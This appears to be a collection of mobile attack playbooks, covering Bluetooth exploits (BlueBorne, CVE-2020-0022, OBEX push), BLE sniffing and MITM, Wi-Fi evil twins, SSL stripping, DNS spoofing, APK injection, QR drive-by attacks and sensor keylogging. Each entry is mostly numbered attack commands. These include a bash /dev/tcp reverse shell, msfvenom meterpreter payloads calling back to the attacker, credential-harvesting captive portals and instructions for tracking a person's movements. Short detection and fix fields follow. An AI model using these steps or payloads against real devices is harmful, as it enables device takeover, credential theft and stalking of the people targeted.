Attack Steps: 1. Set up a Kali Linux machine (can be virtual or physical) with a Bluetooth adapter (lsusb to verify it's detected). Make sure Bluetooth is enabled via rfkill unblock bluetooth and hciconfig hci0 up. 2. Clone BlueBorne scanner and exploit repo: Run git clone https://github.com/Exploitables/BlueBorne-Exploits.git and cd BlueBorne-Exploits/. 3. Install dependencies: Use sudo apt install python3-pip and pip3 install pybluez. Also install libbluetooth-dev. 4. Enable L2CAP socket access: Make sure you're running Python scripts as root or with CAP_NET_RAW capabilities. You may use: sudo setcap cap_net_raw+eip $(readlink -f $(which python3)). 5. Scan for Bluetooth devices nearby: Use hcitool scan or bluetoothctl to get the MAC address of nearby Android devices. 6. Verify if target is vulnerable: Use blueborne-scanner.py script (from Armis repo): python3 blueborne-scanner.py hci0. This scans devices for CVE-2017-0785 and others. 7. Choose target MAC address from scan result (e.g., C8:69:CD:3A:42:55). 8. Launch the exploit: Use cve-2017-0785.py or respective CVE script from the repo: python3 cve-2017-0785.py <TARGET_MAC>. This sends a specially crafted SDP packet that overflows the buffer in the Bluetooth daemon. 9. Gain shell access (PoC may open reverse shell or crash the daemon): If successful, you can escalate to RCE via injected payloads or maintain persistence. 10. Verify control: Use injected payloads like opening reverse TCP connection to your machine: nc -lvp 4444. Modify the payload in exploit script to execute: bash -i >& /dev/tcp/YOUR_IP/4444 0>&1. 11. You now have code execution on target device without it pairing or interacting.
Target Type: Android (pre-8.0), Linux Devices with BlueZ, IoT with Bluetooth
Impact: Full device compromise, remote code execution, persistence, lateral movement
Detection Method: Monitor SDP traffic anomalies, audit hci0 daemon logs, look for L2CAP injection
Solution: Patch OS to latest security level, disable Bluetooth if unused, segment Bluetooth stack

Title: Bluetooth Unauthorized File Access (Obex Push Profile Abuse)
Scenario Description: The attacker abuses the OBEX Push Profile to send arbitrary files (malware, payloads, fake images) to a nearby mobile device. Some Android devices automatically accept or store files when Bluetooth is enabled, especially older or improperly configured devices, enabling silent data injection or social engineering.
Tools Used: Linux with BlueZ, obexftp, sdptool, Android Device (Bluetooth enabled), Python
Attack Steps: 1. Install obexftp: On Kali or Ubuntu, run sudo apt install obexftp bluez bluez-tools. This allows Bluetooth-based file transfers using OBEX protocol. 2. Scan for nearby Bluetooth devices: Run hcitool scan or bluetoothctl to discover devices. Note the MAC address of the victim (e.g., 98:D3:31:F7:92:1B). 3. Verify OBEX Push Profile support: Use sdptool browse <MAC> to list supported Bluetooth profiles. Look for “OBEX Object Push”. 4. Create a malicious or fake file: For example, a fake Android app named Update.apk, or InstaPics.jpg.exe. You can use tools like msfvenom: msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -o Update.apk. 5. Send file using obexftp: Run the command obexftp --nopath --noconn --uuid none --bluetooth <MAC> --channel 9 --put Update.apk. If channel 9 fails, try 10, 12, or whatever sdptool reported for OBEX. 6. Observe file delivery: On some devices, the file is auto-accepted, or prompts with a misleading filename (like a “Photo”). Users unaware may install or open it. 7. Wait for victim to interact with file: If payloaded with a reverse shell, set up listener: msfconsole → use multi/handler → set payload → exploit. 8. Gain access: Once victim opens the file, connection is established back to attacker.
Target Type: Android devices (older or misconfigured), IoT, Windows laptops
Vulnerability: Lack of OBEX auth, missing confirmation, insecure pairing
Impact: Silent file delivery, malware install, social engineering
Detection Method: Monitor OBEX traffic, review auto-download settings
Solution: Disable OBEX Push or require manual confirmation

Title: Bluetooth L2CAP Buffer Overflow (Android RCE)
Scenario Description: The attacker sends a specially crafted L2CAP packet to overflow the Bluetooth daemon memory of nearby Android devices. This causes Remote Code Execution (RCE) without any user interaction. The bug lies in how Android's Bluetooth stack (bluedroid) handles L2CAP length validation.
Tools Used: Kali Linux, BlueZ, Python, Bluetooth Adapter, Android device (unpatched), CVE-2020-0022 PoC
Attack Steps: 1. Install required tools: On Kali or Linux, install BlueZ (sudo apt install bluez) and Python 3. 2. Clone PoC repo for CVE-2020-0022: git clone https://github.com/luanmonk/CVE-2020-0022. 3. Enter the exploit directory and review script: cd CVE-2020-0022 && nano poc.py. The script crafts malformed L2CAP packets. 4. Enable Bluetooth adapter: hciconfig hci0 up and ensure visibility with bluetoothctl. 5. Scan for vulnerable devices: hcitool scan to find nearby Android devices with Bluetooth on. 6. Modify target MAC in PoC: In the Python script, replace the target MAC with the victim’s device. 7. Run the exploit: sudo python3 poc.py. The payload triggers a heap buffer overflow in the victim’s bluedroid stack. 8. Observe result: On unpatched devices, this may crash Bluetooth, reboot system, or open shell (if payloaded). Combine with payload (e.g., reverse shell) for full RCE. 9. Optional: Modify payload to execute shell command, download malware, or open reverse TCP using custom crafted L2CAP extension. 10. Use msfconsole for listener: If using payload: use exploit/multi/handler, set correct LHOST/LPORT. When victim is compromised, shell is granted.
Vulnerability: CVE-2020-0022 (L2CAP buffer overflow in bluedroid stack)
Impact: Full device takeover, persistent control, crash or RCE
Detection Method: Monitor kernel logs, crash reports, analyze malformed packets
Solution: Patch OS, disable Bluetooth if not needed, HCI-level packet filtering

Title: Bluetooth MAC Tracking and Fingerprinting
Scenario Description: The attacker scans and tracks Bluetooth MAC addresses over time to uniquely identify, fingerprint, and follow a target user or device. Many devices broadcast their Bluetooth MAC even when idle, leaking information like device type, OS, and behavior.
Tools Used: Linux with BlueZ, btmon, l2ping, hcitool, btle-sniffer, Wireshark
Attack Steps: 1. Install BlueZ and tools: Use Kali or Ubuntu: sudo apt install bluez bluez-tools wireshark. 2. Enable Bluetooth adapter: Run hciconfig hci0 up and rfkill unblock bluetooth. 3. Start passive scan: Use hcitool lescan --duplicates or bluetoothctl scan on to discover advertising devices. Let it run for 10–30 mins. 4. Log MACs and timestamps: Save output to file: hcitool lescan > mac_log.txt. Include timestamps to correlate movement. 5. Run btmon: sudo btmon captures HCI events in real time and reveals manufacturer info from MAC prefix (first 3 bytes = vendor OUI). 6. Identify target devices: Match MAC to vendor (e.g., Apple, Samsung) using IEEE OUI list. Look at advertising name (DeviceName, UUID). 7. Fingerprint behavior: Track signal strength (RSSI) and reappearance patterns to determine movement, device location, even person identity over time. 8. Advanced step: Use BLE sniffers like Ubertooth One or Nordic sniffer to capture precise packet data, even when MAC randomization is enabled. 9. Correlate MACs with physical user: Watch patterns of presence near cafes, schools, offices to build movement profile. 10. Build full fingerprinting profile: Combine MACs, device name, UUID, frequency to uniquely track user across places.
Target Type: All Bluetooth-enabled mobile and IoT devices
Vulnerability: Unchanged MAC, weak MAC randomization, advertising beacons
Impact: Privacy breach, physical tracking, movement profiling
Detection Method: Detect repeated MAC queries, check Bluetooth activity logs
Solution: Enforce MAC randomization, limit advertising, Bluetooth hygiene

Title: BLE Hijacking via Passive Eavesdropping Attack
Attack Type: Bluetooth Exploits (BlueBorne & Others) → Bluetooth Smart (BLE) Hijacking / Eavesdropping
Scenario Description: An attacker within Bluetooth range performs passive eavesdropping during the BLE pairing process using vulnerable BLE devices (e.g., fitness bands, IoT devices, mobile phones). If the pairing method lacks encryption or uses "Just Works", the attacker can capture the Long Term Key (LTK) or session keys and later decrypt BLE traffic or hijack the session, leading to data theft or command injection.
Tools Used: Ubertooth One, Wireshark with BLE plugin, hcitool, hcxdumptool, Linux/macOS, vulnerable BLE device (e.g., fitness tracker), GATTacker, BLEAH, BLE Suite
Attack Steps: 1. Prepare the Setup: Install Wireshark, BLE plugins, and set up Ubertooth One or compatible Bluetooth sniffer on a Linux or macOS system. 2. Identify the Target: Use hcitool lescan or tools like BLEAH to discover nearby BLE-enabled devices (e.g., wearable devices or IoT gadgets). 3. Start Sniffing BLE Traffic: With Ubertooth One, run BLE sniffing commands and capture advertisements and connection requests. Example: ubertooth-btle -f -c or capture PCAPs via Wireshark. 4. Detect Insecure Pairing Method: Identify if the BLE pairing is using "Just Works" or unauthenticated LE Legacy pairing by analyzing the pairing request packets. 5. Intercept the Key Exchange: During initial pairing, capture LTK, STK (Short Term Key), or session keys. This is feasible if encryption is weak or missing. 6. Replay or Decrypt Communication: Once keys are captured, decrypt BLE packets to view transmitted data (e.g., health info, commands). 7. Hijack BLE Session (Optional): Using tools like GATTacker, inject malicious GATT commands to modify or read data from the BLE device. 8. Persistent Surveillance (Optional): Use passive sniffing to monitor BLE traffic indefinitely, especially if the device reuses keys or lacks re-pairing mechanisms.
Target Type: BLE-enabled mobile/IoT devices (e.g., smartwatches, fitness bands, BLE peripherals)
Vulnerability: BLE pairing without authentication or using "Just Works" (Unauthenticated LE Legacy Pairing)
Impact: Theft of personal data, session hijacking, unauthorized control of device functions, BLE command injection
Detection Method: Analyze pairing requests, inspect entropy in session key exchanges, monitor GATT activity patterns in BLE traffic
Solution: Use authenticated pairing modes (e.g., Passkey Entry or Numeric Comparison), update firmware, enforce secure BLE protocols (LE Secure Connections), disable pairing in production devices
Source: 1. Ubertooth Docs 2. BLE Sniffing Blog 3. Nordic BLE Security 4. BLEAH Tool 5. GATTacker

Title: BLE MITM via GATT Injection
Attack Type: Bluetooth Exploits (BlueBorne & Others) → BLE MITM via GATT Injection
Scenario Description: An attacker performs a Man-in-the-Middle (MITM) attack between a smartphone and a BLE peripheral (e.g., smart bulb, fitness tracker), intercepting and modifying Generic Attribute Profile (GATT) commands. This allows full manipulation of BLE data—reading private data or sending unauthorized control commands. The attack targets insecure BLE pairing methods and misconfigured GATT permissions.
Tools Used: Linux/macOS, two Bluetooth adapters, GATTacker, hcitool, gatttool, BLEAH, nRF Connect app, BLE device, smartphone
Attack Steps: 1. Prepare Dual Bluetooth Setup: On a Linux system, attach two Bluetooth dongles. One will impersonate the peripheral, the other acts as the host. 2. Install GATTacker: Clone and set up the GATTacker framework: git clone https://github.com/securing/gattacker && cd gattacker && npm install 3. Scan and Clone Target Peripheral: Use node clone.js to scan for the BLE device (e.g., fitness band) and clone its services/characteristics. GATTacker will save a JSON file representing the device. 4. Start MITM Proxy: Start GATT proxy with: node mitm.js using the cloned device file. This puts the attacker in the middle between smartphone and BLE device. 5. Connect Victim App/Device: Let the victim app on the phone connect to the spoofed (cloned) BLE device. All traffic is now intercepted. 6. Inject GATT Commands: Modify intercepted read/write requests. Example: when fitness tracker sends heart rate = 80 bpm, modify it to 120 bpm. Or inject unauthorized commands to turn off/on a smart bulb. 7. Log or Store Stolen Data: Store GATT values being read (health info, commands, etc.) for later analysis. 8. Clean Exit: Stop MITM proxy and restore network; cover tracks by resetting Bluetooth adapter.
Target Type: BLE-enabled mobile/IoT devices (e.g., fitness trackers, smart bulbs)
Vulnerability: Insecure pairing + unencrypted GATT + lack of authentication in characteristics
Impact: Device hijack, data exfiltration, unauthorized control, integrity tampering
Detection Method: Unusual GATT request/response patterns, device behavior anomalies, Bluetooth traffic analysis
Solution: Enforce LE Secure Connections, use encrypted authenticated pairing (e.g., Numeric Comparison), restrict GATT permissions (read/write with auth)
Source: GATTacker GitHub nRF BLE Docs MITM BLE Post BLEAH Tool

Title: iOS Bluetooth Pairing Leak (CVE‑2020‑9770)
Attack Type: Bluetooth Exploits (BlueBorne & Others) → iOS Bluetooth Pairing Leak
Scenario Description: A vulnerability in iOS versions < 13.4 allows pairing key leaks during Bluetooth connections. An attacker near the victim can sniff the pairing process (especially with BLE devices) and derive the LTK or encryption keys. This permits future decryption of BLE traffic or impersonation of devices, even without user approval.
Tools Used: Linux/macOS, Wireshark with BLE plugin, hcitool, Ubertooth One, iOS device (<13.4), BLE peripheral, python, hcxdumptool
Attack Steps: 1. Setup Sniffing Environment: Connect Ubertooth One or similar BLE sniffing tool to your Linux/macOS system. Install Wireshark with BLE plugins. 2. Scan for BLE Devices: Use hcitool lescan to find the BLE devices around you. Identify the device pairing with an iOS device (e.g., BLE headphones, smart tracker). 3. Start BLE Sniffing: Run Ubertooth with ubertooth-btle -f to follow the connection. Simultaneously start Wireshark to capture BLE pairing packets. 4. Monitor the iOS Pairing Process: Wait for the BLE device and iPhone to start pairing. In vulnerable iOS (<13.4), pairing data is exposed during "Just Works" mode. 5. Capture Pairing Key Exchange: Use Wireshark to capture the pairing request/response packets. Note the Temporary Key (TK) and confirm if it's all-zero (a known vulnerability). 6. Derive LTK/STK: Using Python or BLE toolkits, calculate the STK from the captured TK/Random values and extract the LTK. 7. Use Derived Key to Decrypt Traffic: Later BLE communications (health data, audio control) can now be decrypted using this key, even without ongoing pairing. 8. Optional – Impersonate BLE Device: With LTK known, use GATT spoofing to impersonate the BLE peripheral or replay commands. 9. Cleanup: Stop sniffer tools and analyze decrypted traffic in Wireshark.
Target Type: iPhones/iPads with iOS < 13.4, paired BLE accessories
Vulnerability: CVE‑2020‑9770 – flawed pairing logic allows key disclosure
Impact: Privacy leakage, decrypted BLE traffic, impersonation of trusted devices
Detection Method: Monitor for unencrypted key exchange, verify TK entropy during BLE pairing
Solution: Update to iOS ≥ 13.4, avoid “Just Works” pairing, enable LE Secure Connections, re-pair devices with secure methods
Source: NVD BlackHills BLE MITM Payatu BLE Analysis WITPress BLE Research PDF

Title: Evil Twin with Captive Portal (Credential Theft)
Attack Type: Wi-Fi Exploits (Rogue AP, Evil Twin) – Mobile Focus → Evil Twin with Captive Portal
Scenario Description: An attacker sets up a fake Wi-Fi hotspot with the same SSID as a legitimate network (e.g., "Free_Airport_WiFi"). Users connect to the fake AP and are redirected to a captive portal that mimics a login page. Credentials entered are logged and harvested by the attacker.
Tools Used: Kali Linux, Wi-Fi USB adapter (monitor/AP mode), hostapd, dnsmasq, iptables, apache2 or lighttpd, custom HTML/PHP portal, sslstrip, ettercap
Attack Steps: 1. Enable Monitor Mode: airmon-ng start wlan02. Setup Fake AP (Evil Twin): Configure hostapd.conf with same SSID as real network and launch: hostapd hostapd.conf3. Create DHCP/DNS Redirect: Configure dnsmasq.conf to give out IPs and redirect all DNS to attacker IP.4. Redirect HTTP/HTTPS: Use iptables to redirect traffic to port 80. Enable sslstrip to downgrade HTTPS.5. Serve Captive Portal: Place a fake login page at /var/www/html/index.php (e.g., corporate login mimic). Log credentials via PHP form.6. Deauth Real Network: Use aireplay-ng --deauth 10 -a <BSSID> to kick users and force them to connect to Evil Twin.7. Capture Credentials: Once users connect, the fake login page grabs credentials and stores them in a file (e.g., creds.txt).8. Clean Up: Shut down services and restore IP tables: iptables -F, airmon-ng stop wlan0mon.
Vulnerability: Open Wi-Fi, weak certificate validation, trusting SSIDs
Impact: Theft of login credentials, unauthorized access, further phishing or account hijacking
Detection Method: Duplicate SSID/BSSID detection, unexpected captive portal, rogue AP monitoring tools
Solution: Enforce HTTPS with cert pinning, avoid open networks, use VPNs, deploy WPA2 Enterprise

Title: Evil Twin with Captive Portal (Credential Theft)
Scenario Description: An attacker sets up a fake Wi-Fi access point (Evil Twin) mimicking a real public Wi-Fi (e.g., a coffee shop or airport). Once a mobile user connects, they are redirected to a fake login page (Captive Portal) resembling a legitimate login portal. When users enter credentials (e.g., email, social logins), the attacker harvests them.
Tools Used: Airbase-ng, Bettercap, DnsChef, Captive-Portal, Responder, Laptop with Wi-Fi adapter (monitor mode capable)
Attack Steps: 1. Choose a location with public Wi-Fi (e.g., Starbucks). 2. Use airmon-ng to enable monitor mode on your wireless card: airmon-ng start wlan0 3. Launch an Evil Twin AP using airbase-ng: airbase-ng -e "Starbucks_WiFi" -c 6 wlan0mon 4. Enable internet connection sharing from host system (if needed). 5. Set up dnsmasq or DnsChef to redirect all DNS requests to attacker's IP. 6. Host a fake Captive Portal using Python HTTP server or Apache/Nginx. Page should mimic login screens (e.g., Google, Facebook, or public Wi-Fi login). 7. Use a keylogger or backend script to log submitted credentials. 8. Wait for mobile users to auto-connect to your rogue AP. 9. As they access internet, they are redirected to your captive portal. 10. User submits credentials, which get stored on attacker's machine.
Vulnerability: Lack of Wi-Fi authentication, auto-connect behavior
Detection Method: Monitor unknown SSIDs with tools like Wireshark, kismet, mobile warnings
Solution: Disable auto-connect, verify captive portals, use VPN
Tags: Evil Twin, Captive Portal, Wi-Fi Phishing, Mobile, Man-in-the-Middle

Title: Session Hijacking Over Open Wi-Fi (Sidejacking)
Scenario Description: On an open (unencrypted) Wi-Fi network, an attacker captures session cookies from mobile app or browser traffic that lack HTTPS. Using tools like Wireshark or Bettercap, they hijack sessions and gain unauthorized access to the victim's account (e.g., social media, email).
Tools Used: Bettercap, Ettercap, Wireshark, Ferret & Hamster, Mobile with open Wi-Fi
Attack Steps: 1. Connect to the same public open Wi-Fi as the target (e.g., airport, café). 2. Launch bettercap or ettercap to start packet sniffing: bettercap -iface wlan0 3. Enable sniffing modules: net.sniff on 4. Target all hosts on the network: net.probe on 5. Use http.proxy or https.proxy modules to intercept cookie-based sessions. 6. Capture and extract session cookies using packet inspection (Wireshark or ferret). 7. Import stolen session cookie into browser using EditThisCookie extension. 8. Access the victim's session as if authenticated (e.g., Gmail, Facebook). Note: Most modern apps use HTTPS, but older or custom apps may still leak credentials.
Vulnerability: Unencrypted traffic, session cookies over HTTP
Detection Method: Monitor ARP poisoning, check for duplicate IPs
Solution: Enforce HTTPS-only apps/sites, use VPN on public Wi-Fi
Tags: Sidejacking, Session Cookie Theft, Mobile, Open Wi-Fi, MITM

Title: Fake App Update via Open Wi-Fi (APK Injection)
Scenario Description: An attacker creates a rogue Wi-Fi hotspot that mimics a trusted open network. When a mobile device connects, the attacker intercepts HTTP traffic and injects a malicious APK file disguised as a legitimate app update (e.g., WhatsApp, Google Chrome). Unsuspecting users download and install it, resulting in full device compromise.
Tools Used: EvilAP, Ettercap, Bettercap, mitmproxy, APKTool, msfvenom, Burp Suite, Fake APK
Attack Steps: 1. Create a rogue access point with name similar to trusted network (e.g., Free_Public_WiFi). 2. Use airbase-ng or hostapd to launch fake AP. 3. Configure dnsmasq to redirect all DNS to attacker’s IP. 4. Intercept HTTP requests with mitmproxy or Burp Suite. 5. Replace original app download links (e.g., from WhatsApp site) with links to malicious APK. 6. Create malicious APK using msfvenom: msfvenom -p android/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -o update.apk 7. Sign APK to avoid installation warning using jarsigner or apktool. 8. Host APK on local server and inject URL into intercepted HTTP response. 9. When the user tries to update the app, they are served the malicious version. 10. Once installed, the attacker gains remote access to the device.
Vulnerability: Lack of certificate pinning, insecure updates
Impact: Remote Device Control, Data Theft, Keylogging
Detection Method: Monitor unknown APKs, validate update sources
Solution: Enforce HTTPS updates, use Google Play only, no sideloading
Tags: APK Injection, Rogue AP, Mobile Malware, Fake Update, MITM

Title: Man-in-the-Middle with SSL Stripping
Scenario Description: An attacker sets up a rogue Wi-Fi access point (Evil Twin) and performs a MitM attack. By using SSL stripping tools, the attacker downgrades HTTPS traffic to HTTP, capturing login credentials and sensitive data from mobile browsers that lack HTTPS enforcement.
Tools Used: airbase-ng, sslstrip, iptables, dnsmasq, Wireshark, Linux machine with wireless adapter
Attack Steps: 1. Set Wi-Fi adapter to monitor mode: airmon-ng start wlan0 2. Launch Evil Twin AP with airbase-ng -e "FreeWiFi" -c 6 wlan0mon 3. Set up IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward 4. Redirect all port 80 traffic to port 10000 (sslstrip): iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 5. Start sslstrip: sslstrip -l 10000 -w ssl_log.txt 6. Set up DHCP/DNS with dnsmasq to assign IP and redirect DNS queries. 7. Wait for victim’s mobile to connect and browse HTTPS websites (e.g., Facebook, banking site). 8. Observe that sslstrip downgrades HTTPS to HTTP, intercepting credentials as plain text. 9. Review ssl_log.txt to view captured POST data, session tokens, credentials.
Vulnerability: Lack of HTTPS enforcement, auto-connect behavior
Detection Method: Use HTTPS-only browser plugins, monitor HSTS headers
Solution: Use VPN, enable HTTPS-only mode, public key pinning
Tags: SSL Stripping, Evil Twin, Mobile MitM, Wi-Fi, HTTPS Downgrade

Title: Malicious DNS Spoofing (Fake App / Site Redirection)
Scenario Description: Attacker sets up a rogue Wi-Fi AP and uses DNS spoofing to redirect legitimate requests (e.g., play.google.com, bank.com) to attacker-controlled servers hosting malicious APKs or phishing pages. Mobile users are tricked into downloading fake apps or entering credentials.
Tools Used: airbase-ng, dnsmasq, ettercap, responder, apache2, malicious APK, msfvenom, hostapd
Attack Steps: 1. Enable monitor mode: airmon-ng start wlan0 2. Launch rogue AP using airbase-ng -e "Cafe_WiFi" or hostapd 3. Install and configure dnsmasq: Add entries like address=/bank.com/192.168.1.1 to redirect DNS 4. Launch local web server (Apache/NGINX) and host cloned website or fake APK. 5. Optionally inject download links to malicious APK (msfvenom generated) via JavaScript or MITM. 6. Use Ettercap or Responder to monitor and capture credential POSTs. 7. When user types bank.com, they are redirected to your fake clone. 8. On the site, users either enter credentials (phished) or download and install the trojanized APK. 9. Attacker gets full access via reverse shell or stolen credentials.
Vulnerability: Insecure DNS resolution, no DNSSEC, open Wi-Fi
Impact: App compromise, credential theft, full remote access
Detection Method: Use DNSSEC, verify domains, inspect certificate chain
Solution: Use secure DNS (DoH/DoT), app store verification, avoid APK sideloading
Tags: DNS Spoofing, Fake App, Evil Twin, Mobile Redirect

Title: App API Traffic Interception (JWT, Tokens, Location)
Scenario Description: An attacker on a rogue Wi-Fi intercepts traffic from mobile apps to APIs (over HTTP or improperly configured HTTPS). If JWTs, OAuth tokens, or location data is unencrypted or improperly signed, the attacker can hijack sessions, impersonate users, or track them.
Tools Used: Burp Suite, mitmproxy, Bettercap, Wireshark, Frida, Android Emulator, sslstrip, hostapd
Attack Steps: 1. Set up rogue AP (hostapd or airbase-ng) with a legit name (e.g., AirportFreeWiFi). 2. Enable IP forwarding and DNS redirection. 3. Launch mitmproxy or Burp Suite in transparent proxy mode. 4. Install custom CA cert on test mobile device to intercept HTTPS (Burp CA cert). 5. Mobile apps route API traffic through proxy (either HTTP or TLS-decrypted HTTPS). 6. Use Burp or mitmproxy to inspect API headers, especially Authorization: Bearer <token>, JWT, Device-ID, or location data in payload. 7. Extract token, replay or modify API requests to access victim data. 8. Optionally modify API response or inject scripts (if app doesn’t validate response hash). 9. Replay location update to simulate GPS spoofing or session hijacking. 10. Optionally script token abuse via Postman or curl.
Vulnerability: No TLS, Insecure APIs, Poor token handling
Impact: Token theft, unauthorized access, GPS spoofing
Detection Method: Monitor API usage anomalies, audit network logs
Solution: Use HSTS, token expiration, secure API design, pin CA cert
Tags: API Interception, JWT Theft, OAuth MITM, Mobile Apps

Title: APK Delivery via Fake Play Store or Popups
Scenario Description: An attacker sets up a rogue Wi-Fi access point and uses fake Play Store interfaces or malicious popups injected via DNS spoofing or HTTP injection. Unsuspecting users are tricked into downloading malicious APKs disguised as app updates or promotions.
Tools Used: airbase-ng, dnsmasq, Ettercap, Burp Suite, APKTool, msfvenom, Apache2, sslstrip, SocialFish
Attack Steps: 1. Enable monitor mode on Wi-Fi adapter: airmon-ng start wlan0 2. Set up Evil Twin AP using: airbase-ng -e "Airport_Free_WiFi" -c 6 wlan0mon 3. Configure dnsmasq to redirect DNS queries for play.google.com to attacker IP: address=/play.google.com/192.168.1.1 4. Clone the Google Play Store UI using HTTrack or SocialFish, modify it to display update prompts for popular apps. 5. Generate a malicious APK using msfvenom: msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -o update.apk 6. Host the APK on Apache server: cp update.apk /var/www/html 7. Intercept HTTP requests using Burp Suite or sslstrip and inject popup JavaScript (e.g., "New WhatsApp Update Available. Click to Install.") 8. When users click, download starts from your server. 9. If they enable “Install from Unknown Sources,” the APK gets installed. 10. Upon installation, attacker receives meterpreter shell.
Vulnerability: Untrusted APKs, DNS spoofing, poor UX security
MITRE Technique: T1476 (Delivery via App Store Spoof) + T1557.001 (DNS Spoofing)
Impact: Full device compromise, surveillance, credential theft
Detection Method: Analyze DNS logs, unexpected popups, app certificate mismatch
Solution: Use Play Protect, verify URLs/certs, enforce MDM and no sideload policy
Tags: APK Injection, Fake Play Store, Evil Twin, Mobile Popups

Title: Drive-By Payload via QR-Based Wi-Fi
Attack Type: QR Code Social Engineering + Rogue AP
Scenario Description: Attacker generates a malicious QR code containing Wi-Fi credentials (SSID/password) for a rogue AP. When scanned, a mobile device connects automatically. The attacker then delivers drive-by payloads through browser or app redirects, silently initiating downloads or phishing attempts.
Tools Used: QRGen, airbase-ng, hostapd, dnsmasq, Burp Suite, msfvenom, Apache2, Evilginx2, Python HTTP Server
Attack Steps: 1. Create a malicious AP (e.g., Cafe_WiFi_Plus) using hostapd or airbase-ng. 2. Set up DHCP and DNS using dnsmasq to provide IP and redirect all domains to attacker-controlled IP. 3. Host a drive-by payload page with JavaScript auto-download behavior on Apache/Nginx: index.html triggers download of malicious APK. 4. Generate payload using msfvenom: msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -o trojan.apk 5. Host this payload on the web server: mv trojan.apk /var/www/html 6. Use qrencode to generate QR code: qrencode -o wifi_qr.png "WIFI:T:WPA;S:Cafe_WiFi_Plus;P:password123;;" 7. Print or display the QR in a public area with a label like "Scan for Free Wi-Fi" 8. Victim scans QR → connects to rogue AP → visits a page → automatic download of trojan APK or redirect to fake Google Play/phishing. 9. If APK is installed, attacker gains full access. If not, phishing data may still be harvested.
Vulnerability: Social engineering, auto-connect via QR, no APK source verification
MITRE Technique: T1189 (Drive-by Compromise), T1557.002 (Wireless MitM), T1204.002 (User Execution via App)
Impact: Remote access, data exfiltration, session theft
Detection Method: Monitor auto-downloads, analyze QR payloads, browser logs
Solution: Train users to verify networks, enforce QR scan policies, disable auto-connect
Tags: QR Wi-Fi, Drive-By Download, APK Exploit, Mobile Rogue AP

Title: Power Analysis Attack (App Inference via Power Consumption)
Scenario Description: Attacker uses side-channel data such as voltage or power fluctuations from mobile charging ports or external monitors to infer what apps are being used (e.g., messaging, banking). Each app has a unique power signature. If a malicious charging station or USB port is compromised, it can silently monitor and record usage behavior.
Tools Used: Modified USB power meter (e.g., USB Doctor), Arduino/Teensy, Oscilloscope, Python (NumPy, SciPy), Android Debug Bridge (ADB), Malicious charging port
Attack Steps: 1. Set up a malicious charging port (public USB hub or charging station) connected to a microcontroller like Teensy/Arduino that records voltage/current at high resolution. 2. Use USB Doctor or build a custom USB inline meter with voltage/current monitoring. 3. Connect target mobile phone via USB to this station. 4. Start logging power consumption at microsecond intervals while the user interacts with the phone. 5. Analyze power traces using Python (NumPy, Pandas, Matplotlib) to find recurring patterns. 6. Use machine learning (e.g., SVM, Random Forest) trained on app-specific power signatures (WhatsApp, Instagram, GPay, etc.) 7. Infer which app was used based on timing, spikes, and background activity. 8. If combined with ADB (in unlocked/debug mode), further app interaction data may be collected.
Vulnerability: Physical access + charging port manipulation, power leakage
Impact: App usage profiling, app fingerprinting, privacy loss
Detection Method: Unusual USB behavior, voltage monitoring tools
Solution: Block data access on USB by default, use trusted chargers, disable developer mode
Tags: Power Analysis, Charging Port Attack, Side-Channel, Mobile Privacy

Title: TapLogger Attack (Touchscreen Tap via Accelerometer)
Scenario Description: TapLogger-style attacks leverage unprotected access to motion sensors (accelerometer) to infer screen taps or keyboard input. Since mobile OSs often do not require permissions for accelerometer access, a background app can passively record tap events. Using ML, attackers infer tap positions and entered text.
Tools Used: Custom Android App, Android SDK, Accelerometer API, Python (SciPy, Keras), Android Emulator, Logcat
Attack Steps: 1. Build a background Android app that reads accelerometer and gyroscope values with high frequency. 2. Publish this app disguised as a utility app (e.g., battery saver) or side-load it. 3. When user interacts with device (tapping PINs, passwords, etc.), the app records sensor changes for each tap. 4. The sensor data is timestamped and sent to remote attacker-controlled server or stored locally. 5. Use Python with ML libraries (TensorFlow/Keras) to train a model to detect tap locations and infer likely key presses (based on device orientation and known keyboard layout). 6. Analyze and reconstruct entered text like PIN, password, or chat messages. 7. Optionally combine with screen state info (via ADB or logcat) for higher accuracy.
Vulnerability: Unrestricted sensor access, lack of user awareness
Detection Method: Monitor abnormal sensor usage in background apps
Solution: Limit sensor rate in background, OS-level sensor permissions, static/dynamic app analysis
Tags: TapLogger, Sensor Spy, Accelerometer Logging, Android Keylogging

Title: Sensor-Based Keylogging (Accelerometer + Gyroscope)
Scenario Description: Similar to TapLogger, but this version leverages both accelerometer and gyroscope for high-resolution tap motion detection. When used together, they can infer user keystrokes with >80% accuracy on QWERTY keyboard layouts without requiring any special permission on Android.
Tools Used: Android Studio, Custom Sensor Logger App, SciPy, Keras, TensorFlow, Logcat, MIT App Inventor (for prototyping)
Attack Steps: 1. Develop an Android app using Android SDK that captures both Sensor.TYPE_ACCELEROMETER and Sensor.TYPE_GYROSCOPE data continuously. 2. Deploy it on the target device (side-loaded or via fake app store/phishing). 3. Log data at 100–200 Hz to maximize temporal resolution. 4. Align sensor readings with screen touches and screen orientation. 5. Export collected logs to CSV for offline processing. 6. Train an LSTM-based neural network model (TensorFlow/Keras) on known typing samples using the same device layout. 7. Use this model to classify unknown inputs (passwords, typed content) from recorded sensor logs. 8. Optionally correlate gyroscope roll/pitch changes with screen keyboard zones (left vs. right keys) for improved precision.
Vulnerability: Background sensor access, side-channel data leakage
Impact: Stealth keylogging, text input inference without detection
Detection Method: Unusual sensor logging, spike in background sensor read rate
Solution: Restrict background sensor access, OS-level control, enforce app vetting
Tags: Keylogging, Android Side-Channel, Motion Sensors, ML-Based Inference

Title: PIN Skimming via Motion+Audio Sensors (PIN Skimmer)
Scenario Description: In this attack, a malicious app running in the background uses motion (accelerometer/gyroscope) and audio (microphone) sensors to detect vibrations, device tilt, and tap sounds. These side-channel signals are used to infer the numeric PIN entered on a touchscreen keypad. Because many mobile OSs (especially Android) do not require permissions for sensor access, this attack can run silently without alerting the user.
Tools Used: Android SDK, Custom Android App, Sensor.TYPE_ACCELEROMETER, Sensor.TYPE_GYROSCOPE, Microphone access (MediaRecorder), Python (NumPy, SciPy, TensorFlow), ML/DL Frameworks (Keras, PyTorch), Android Emulator or Physical Device
